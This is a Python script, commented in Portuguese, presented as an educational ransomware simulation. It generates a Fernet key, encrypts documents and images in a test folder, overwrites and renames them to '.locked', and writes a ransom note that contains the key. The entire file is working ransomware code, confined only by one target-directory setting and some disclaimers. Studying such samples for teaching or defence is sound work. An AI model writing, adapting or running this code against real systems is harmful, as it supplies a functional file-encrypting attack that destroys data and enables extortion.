import os
from cryptography.fernet import Fernet

# ----------------------------------------------------------------------
# ATENÇÃO: ESTE CÓDIGO É ESTRITAMENTE PARA FINS EDUCACIONAIS E DE TESTE
# ----------------------------------------------------------------------

# 1. Definições de Caminho
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(BASE_DIR, 'arquivos_teste')
KEY_FILE = os.path.join(BASE_DIR, 'chave_secreta.key')
EXTENSOES_ALVO = ['.txt', '.pdf', '.docx', '.jpg'] # Simulação de alvos

def gerar_chave():
    """Gera uma chave Fernet e a salva em um arquivo."""
    chave = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(chave)
    print(f"Chave gerada e salva em: {KEY_FILE}")
    return chave

def carregar_chave():
    """Carrega a chave do arquivo (para descriptografia)."""
    if not os.path.exists(KEY_FILE):
        print("ERRO: Chave secreta não encontrada. Execute primeiro a criptografia.")
        return None
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

def criptografar_arquivo(caminho_arquivo, fernet):
    """Lê, criptografa e sobrescreve um arquivo."""
    try:
        with open(caminho_arquivo, 'rb') as file:
            dados_originais = file.read()

        dados_criptografados = fernet.encrypt(dados_originais)

        with open(caminho_arquivo, 'wb') as file:
            file.write(dados_criptografados)
            
        print(f"[+] CRIPTOGRAFADO: {caminho_arquivo}")

        # Renomeia para simular a extensão do ransomware
        novo_caminho = caminho_arquivo + '.locked'
        os.rename(caminho_arquivo, novo_caminho)
        print(f"[*] Renomeado para: {os.path.basename(novo_caminho)}")

    except Exception as e:
        print(f"[!] Erro ao criptografar {caminho_arquivo}: {e}")

def ataque_ransomware_simulado():
    """Aplica a criptografia aos arquivos de teste."""
    print("--- INICIANDO SIMULAÇÃO DE RANSOMWARE ---")
    chave = gerar_chave()
    fernet = Fernet(chave)

    arquivos_encontrados = 0
    
    # 2. Percorre a pasta alvo
    for arquivo in os.listdir(TARGET_DIR):
        caminho_completo = os.path.join(TARGET_DIR, arquivo)
        
        # 3. Verifica se é um arquivo e se a extensão é alvo
        if os.path.isfile(caminho_completo) and any(caminho_completo.endswith(ext) for ext in EXTENSOES_ALVO):
            criptografar_arquivo(caminho_completo, fernet)
            arquivos_encontrados += 1

    if arquivos_encontrados == 0:
        print("Nenhum arquivo alvo encontrado para criptografar.")

    # 4. Geração da Mensagem de "Resgate"
    mensagem = f"""
    ################################################################
    # SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! (Simulação Educacional) #
    ################################################################
    
    Seus documentos importantes, fotos e outros arquivos foram bloqueados
    usando criptografia robusta (Fernet). 
    
    Para recuperar seus arquivos, execute o 'descriptografador.py' 
    e forneça a chave gerada. 
    
    Não tente quebrar a criptografia. O tempo está correndo!
    
    (Chave de descriptografia: {chave.decode()}) <-- Apenas para fins de teste!
    """
    
    resgate_file = os.path.join(TARGET_DIR, 'LEIA_ME_RESGATE.txt')
    with open(resgate_file, 'w') as f:
        f.write(mensagem)
        
    print(f"\n[!!!] Mensagem de Resgate gerada em: {resgate_file}")
    print("\n--- SIMULAÇÃO DE RANSOMWARE CONCLUÍDA ---")

if __name__ == "__main__":
    ataque_ransomware_simulado()
